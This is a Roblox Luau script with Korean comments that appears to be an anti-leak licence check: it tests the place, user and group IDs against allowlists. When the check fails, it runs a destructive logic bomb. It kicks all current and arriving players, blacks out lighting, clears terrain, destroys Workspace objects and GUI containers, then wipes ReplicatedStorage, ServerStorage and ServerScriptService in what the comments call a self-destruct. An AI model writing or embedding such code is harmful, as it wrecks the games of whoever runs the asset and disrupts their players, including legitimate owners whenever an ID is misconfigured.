-- [[ sys1-0 : 삼중 검증 및 확장 제어 엔진 ]]
local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")

-- 1. 삼중 마스터 화이트리스트 데이터베이스
local ALLOWED_PLACES = {
	[123456789] = true, -- 허가된 Place ID
}

local ALLOWED_USERS = {
	[11223344] = true,  -- 허가된 User ID
}

local ALLOWED_GROUPS = {
	[99887766] = true,  -- 허가된 Group ID
}

-- 2. 현재 환경 정보 수집
local currentPlaceId = game.PlaceId
local currentCreatorId = game.CreatorId
local currentCreatorType = game.CreatorType

--------------------------------------------------
pcall(function()
	game.ReplicatedStorage.data.Value = true
end)
--------------------------------------------------


-- 3. 교차 검증 검사
local isAuthorized = false

if ALLOWED_PLACES[currentPlaceId] then
	isAuthorized = true
	--------------------------------------------------
	pcall(function() game.ReplicatedStorage.pi.Value = true end)
	--------------------------------------------------
end

if currentCreatorType == Enum.CreatorType.User and ALLOWED_USERS[currentCreatorId] then
	isAuthorized = true
	--------------------------------------------------
	pcall(function() game.ReplicatedStorage.ui.Value = true end)
	--------------------------------------------------
end

if currentCreatorType == Enum.CreatorType.Group and ALLOWED_GROUPS[currentCreatorId] then
	isAuthorized = true
	--------------------------------------------------
	pcall(function() game.ReplicatedStorage.gi.Value = true end)
	--------------------------------------------------
end


-- 4. 조건별 실행 분기
if isAuthorized then
	-- ==========================================
	-- [인증 완료] 정상 작동 구간
	-- ==========================================
	pcall(function() game.ReplicatedStorage.good.Value = true end)
	--------------------------------------------------
	-- 님의 핵심 작동 코드를 여기에 배치
	--------------------------------------------------
else
	-- ==========================================
	-- [인증 실패] 비인가 환경 제어 구간
	-- ==========================================
	pcall(function()
		game.ReplicatedStorage.ihateu.Value = true
	end)

	-- [[ 파괴 프로세스 분할 집행 ]]
	-- 각 영역을 완전히 독립된 스레드로 쪼개서, 하나가 터져서 멈춰도 다른 쪽은 무조건 실행되게 만듭니다.

	-- 1. 유저 강퇴 스레드 (독립)
	task.spawn(function()
		local kickMessage = "계약 위반 및 에셋 유출로 인해 이 서버는 무력화되었습니다. (ㅅㄱ)"
		pcall(function()
			for _, player in pairs(Players:GetPlayers()) do
				player:Kick(kickMessage)
			end
		end)
		Players.PlayerAdded:Connect(function(player)
			pcall(function() player:Kick(kickMessage) end)
		end)
	end)

	-- 2. 시각 테러 및 지형 파괴 스레드 (독립)
	task.spawn(function()
		pcall(function()
			game.Lighting.Brightness = 0
			game.Lighting.ClockTime = 0
			game.Lighting.GlobalShadows = true
			game.Lighting:ClearAllChildren()
			game.Lighting.FogEnd = 0
			game.Lighting.Ambient = Color3.new(0, 0, 0)
		end)
		pcall(function()
			game.Workspace.Terrain:Clear()
		end)
	end)

	-- 3. ★ 핵심: 안전한 Workspace(맵 환경)부터 무조건 선빵 필승 파괴 ★
	task.spawn(function()
		pcall(function()
			for _, item in pairs(game.Workspace:GetChildren()) do
				if not item:IsA("Player") and not item:IsA("Camera") and not item:IsA("Terrain") then
					item:Destroy()
				end
			end
		end)
	end)

	-- 4. GUI 및 아이템 창고 파괴 (안전 자산)
	task.spawn(function()
		local safeContainers = { game.StarterGui, game.StarterPack, game.Teams }
		for _, container in ipairs(safeContainers) do
			pcall(function()
				container:ClearAllChildren()
			end)
		end
	end)

	-- 5. ★ 위험 자산 (스크립트가 살고 있는 곳)은 0.5초 뒤에 동시 폭파 ★
	-- 다른 스레드들이 Workspace랑 유저를 다 조질 시간을 벌어준 뒤 마지막에 자폭합니다.
	task.spawn(function()
		task.wait(0.5)
		
		pcall(function()
			game.ReplicatedStorage:ClearAllChildren()
		end)
		pcall(function()
			game.ServerStorage:ClearAllChildren()
		end)
		pcall(function()
			-- 여기서 스크립트가 지워지며 펑 터지겠지만, 이미 위에서 다른 것들은 다 지워진 상태입니다.
			game.ServerScriptService:ClearAllChildren()
		end)
	end)
end

-- 리턴값 세팅
local SystemResult = {
	["Status"] = isAuthorized,
	["Wipe"] = function() end
}
return SystemResult
